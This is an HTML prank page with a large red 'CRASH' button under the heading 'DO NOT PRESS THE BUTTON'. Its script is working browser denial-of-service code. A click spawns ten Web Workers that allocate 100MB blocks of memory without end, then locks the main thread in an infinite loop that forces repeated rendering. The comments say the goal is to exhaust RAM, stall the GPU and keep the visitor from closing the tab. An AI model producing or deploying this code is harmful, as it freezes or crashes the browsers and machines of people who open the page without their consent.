<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SYSTEM</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background: #000;
    color: #ff0033;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
    font-family: monospace;
}
h1 { font-size: 24px; margin-bottom: 50px; letter-spacing: 5px; text-shadow: 0 0 10px #ff0033; text-align: center; padding: 0 20px;}
#crash-btn {
    width: 250px;
    height: 250px;
    border-radius: 50%;
    background: radial-gradient(circle at 30% 30%, #ff4d4d, #990000);
    border: 8px solid #220000;
    box-shadow: 0 20px 50px rgba(255, 0, 51, 0.5), inset 0 -10px 20px rgba(0,0,0,0.8);
    color: #fff;
    font-size: 32px;
    font-weight: 900;
    cursor: pointer;
    transition: transform 0.1s;
    text-shadow: 0 2px 4px rgba(0,0,0,0.8);
    outline: none;
}
#crash-btn:active {
    transform: scale(0.95);
}
</style>
</head>
<body>

<h1>DO NOT PRESS THE BUTTON</h1>
<button id="crash-btn">CRASH</button>

<script>
document.getElementById('crash-btn').addEventListener('click', function() {
    
    // 1. Change screen instantly so they know they fucked up
    document.body.style.background = '#ff0033';
    document.body.innerHTML = '<h1 style="font-size: 60px; color: black; text-shadow: none;">FATAL ERROR</h1>';

    // 2. THE MEMORY BOMB (Web Workers)
    // Spawns 10 background threads, each trying to allocate 100MB of RAM every millisecond.
    try {
        const workerCode = `
            let massiveArray = [];
            while (true) {
                massiveArray.push(new Uint8Array(1024 * 1024 * 100)); // 100MB of zeroes
            }
        `;
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const workerURL = URL.createObjectURL(blob);
        
        // Spawn 10 workers to instantly eat ~1GB of RAM
        for(let i = 0; i < 10; i++) {
            new Worker(workerURL);
        }
    } catch(e) {}

    // 3. THE MAIN THREAD LOCK
    // We give the workers 100ms to start eating, then we lock the main thread completely.
    setTimeout(() => {
        // This forces the CPU to calculate forever, locking the tab so the user can't even close it.
        // It uses a nested loop to prevent the browser from optimizing it away.
        let x = 0;
        while (true) {
            x++;
            if (x > 100000) {
                x = 0;
                // Fake DOM update to force the browser to try and render while locked
                // This causes the GPU to choke and drop the frame rate to 0
                document.body.style.transform = "translate(" + (x % 2) + "px, 0px)"; 
            }
        }
    }, 100);
});
</script>

</body>
</html>
